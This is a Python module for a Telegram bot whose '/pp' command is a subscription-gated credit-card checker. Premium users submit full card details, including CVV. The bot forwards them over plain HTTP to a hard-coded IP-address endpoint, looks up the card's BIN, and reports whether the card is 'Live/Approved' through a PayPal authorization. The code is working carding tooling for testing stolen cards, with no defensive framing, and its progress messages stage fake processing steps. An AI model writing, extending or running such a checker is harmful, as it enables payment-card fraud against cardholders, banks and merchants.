import requests
import time
from datetime import datetime
from telebot.types import Message
from telebot import TeleBot

def load_premium_users(filename="Id.txt"):
    premium_users = {}
    try:
        with open(filename, "r") as file:
            for line in file:
                if line.strip():
                    parts = line.strip().split(":")
                    if len(parts) == 2:
                        user_id = int(parts[0].strip())
                        expiry_timestamp = float(parts[1].strip())
                        premium_users[user_id] = expiry_timestamp
    except FileNotFoundError:
        pass
    return premium_users

def register_pp(bot: TeleBot):

    @bot.message_handler(commands=['pp'])
    def pp_command(message: Message):
        premium_users = load_premium_users()
        user_id = message.from_user.id
        current_time = time.time()

        expiry_timestamp = premium_users.get(user_id)

        if expiry_timestamp is None:
            bot.reply_to(
                message,
                "<b>🚫 Access Denied!</b>\n\n"
                "🔒 <i>You are not a Premium User.</i>\n"
                "📝 <i>Contact admin to buy a plan.</i>",
                parse_mode="HTML"
            )
            return

        if current_time > expiry_timestamp:
            expire_date = datetime.fromtimestamp(expiry_timestamp).strftime("%Y-%m-%d %H:%M:%S")
            bot.reply_to(
                message,
                "<b>🚫 Access Denied!</b>\n\n"
                "⏳ <i>Your Premium Plan has expired.</i>\n"
                f"📅 <b>Expired At:</b> <i>{expire_date}</i>\n"
                "📝 <i>Contact admin to renew your plan.</i>",
                parse_mode="HTML"
            )
            return

        try:
            args = message.text.split(maxsplit=1)
            if len(args) < 2:
                bot.reply_to(
                    message,
                    "<b>⚠️ Usage:</b>\n"
                    "<code>/pp 4213523497522926|12|26|040</code>",
                    parse_mode="HTML"
                )
                return

            cc_data = args[1].strip()
            bin_number = cc_data[:6]
            start_time = time.time()

            # Start progress
            progress = bot.reply_to(message, "<b>🔃 Initializing Premium Check...</b>", parse_mode="HTML")
            processing_steps = [
                "🔰 Connecting to PayPal Gateway...",
                "🔒 Authenticating Card Details...",
                "⚙️ Simulating $1 Authorization...",
                "⏳ Awaiting Response from Issuer...",
                "✅ Analyzing Authorization Results..."
            ]
            for step in processing_steps:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=progress.message_id,
                    text=f"<b>{step}</b>",
                    parse_mode="HTML"
                )
                time.sleep(1)

            # API Calls
            url = f"http://194.164.150.141:5555/key=never/cc={cc_data}"
            response = requests.get(url)

            bin_info_url = f"https://lookup.binlist.net/{bin_number}"
            bin_info_response = requests.get(bin_info_url)

            if response.status_code == 200 and bin_info_response.status_code == 200:
                data = response.json()

                cc_result = data.get("status", "Unknown").strip()
                cc_response = data.get("response", "No Details").strip()
                cc_card = data.get("cc", cc_data)

                bin_data = bin_info_response.json()
                bank = bin_data.get("bank", {}).get("name", "Unknown Bank")
                country = bin_data.get("country", {}).get("name", "Unknown Country")
                card_type = bin_data.get("type", "Unknown Type")

                elapsed = round(time.time() - start_time, 2)
                checked_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                full_name = f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip()
                user_link = f"<a href='tg://user?id={user_id}'>{full_name}</a>"

                # Choose emoji based on result
                if "Approved" in cc_result or "Live" in cc_result:
                    status_icon = "✅"
                    status_tag = "Approved"
                elif "Dead" in cc_result or "Declined" in cc_result:
                    status_icon = "❌"
                    status_tag = "Declined"
                else:
                    status_icon = "⚠️"
                    status_tag = "Unknown"

                # Final Expensive Result
                final_message = (
                    "<b>〄 PAYPAL $0.03 AUTH CHECKER 〄</b>\n\n"
                    f"💳 <b>Card:</b> <code>{cc_card}</code>\n"
                    f"{status_icon} <b>Status:</b> <i>{status_tag}</i>\n"
                    f"💬 <b>Gateway Response:</b> <i>{cc_response}</i>\n"
                    f"🏦 <b>Bank:</b> <i>{bank}</i>\n"
                    f"🌎 <b>Country:</b> <i>{country}</i>\n"
                    f"💳 <b>Type:</b> <i>{card_type}</i>\n"
                    f"⏱️ <b>Time Taken:</b> <i>{elapsed}s</i>\n"
                    f"🕒 <b>Checked At:</b> <i>{checked_time}</i>\n"
                    f"👤 <b>Checked By:</b> {user_link}"
                )

                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=progress.message_id,
                    text=final_message,
                    parse_mode="HTML"
                )

            else:
                # HTTP error (like server not reachable)
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=progress.message_id,
                    text=f"<b>❌ Server Error:</b>\n<i>Unable to reach the Gateway. Try later.</i>",
                    parse_mode="HTML"
                )

        except Exception as e:
            # Full failure
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=progress.message_id,
                text=f"<b>⚠️ Internal Error:</b>\n<code>{str(e)}</code>",
                parse_mode="HTML"
            )
